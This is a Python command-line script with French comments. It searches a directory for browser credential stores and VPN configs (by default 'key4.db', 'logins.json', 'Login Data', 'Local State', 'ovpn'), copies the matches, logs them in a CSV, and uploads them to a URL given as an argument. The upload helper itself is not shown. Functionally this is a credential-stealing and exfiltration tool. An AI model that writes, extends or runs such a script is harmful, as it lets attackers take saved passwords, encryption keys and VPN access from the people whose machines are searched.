import argparse
import datetime
import os

from helpers import csv_manager, filemanager


def main(arguments):
    csv_manager.init()  # Initialise le fichier CSV

    # Si l'arguement search_files est défini est n'est pas vide
    if arguments.search_files and arguments.search_files.strip():
        search_files = arguments.search_files
        if os.path.isfile(search_files):  # Si l'argument est un fichier valide
            # On récupère chaque ligne du fichier et les mets dans un tableau
            search_files = [line.rstrip() for line in open(search_files)]
        elif ',' in search_files:  # Si la chaine de caractère contient une virgule
            search_files = search_files.split(',')  # On split la chaine
        else:
            search_files = [search_files]  # On met la chaine dans un tableau
    else:
        # Valeurs recherchés par default
        search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']

    if arguments.contains_text and arguments.contains_text.strip():
        contains_text = arguments.contains_text
        if os.path.isfile(contains_text):
            contains_text = [line.rstrip() for line in open(contains_text)]
        elif ',' in contains_text:
            contains_text = contains_text.split(',')
    else:
        contains_text = ''

    if arguments.path and arguments.path.strip():
        path = arguments.path
    else:
        path = ''  # D:\\Users\\Sorrow\\Desktop\\crawl

    # Recherche les fichiers
    files = filemanager.search_files(search_files, path=path, contains_txt=contains_text)
    # Copie les fichiers
    string = 'Nous avons trouvé {} fichiers, voulez-vous les copier ? (Oui/Non)'.format(len(files))
    accept = input(string)
    if accept.lower() == 'oui':
        # Ajoute chaque fichiers dans le csv
        filenames = filemanager.copy_files(files)
        csv_manager.add_rows(filenames)
    else:
        print("Copie interrompu.")


    # Si l'argument url existe et n'est pas vide
    if arguments.url and arguments.url.strip():
        dl_links = filemanager.send_files(arguments.url)
        csv_manager.update_dl_link(dl_links)


if __name__ == '__main__':
    # Fonction d'appel
    start_time = datetime.datetime.now()

    parser = argparse.ArgumentParser(description='Search files')
    parser.add_argument('--url', dest='url', help='url parameter for http server')
    parser.add_argument('--search-files', dest='search_files',
                        help='file extension to find (\'txt\') or filename to find (\'secret.txt\')')
    parser.add_argument('--contains-text', dest='contains_text', help='text contains in filename')
    parser.add_argument('--path', dest='path', help='base directory to find files')

    args = parser.parse_args()
    main(args)

    end_time = datetime.datetime.now()
    print('Duration: {}'.format(end_time - start_time))
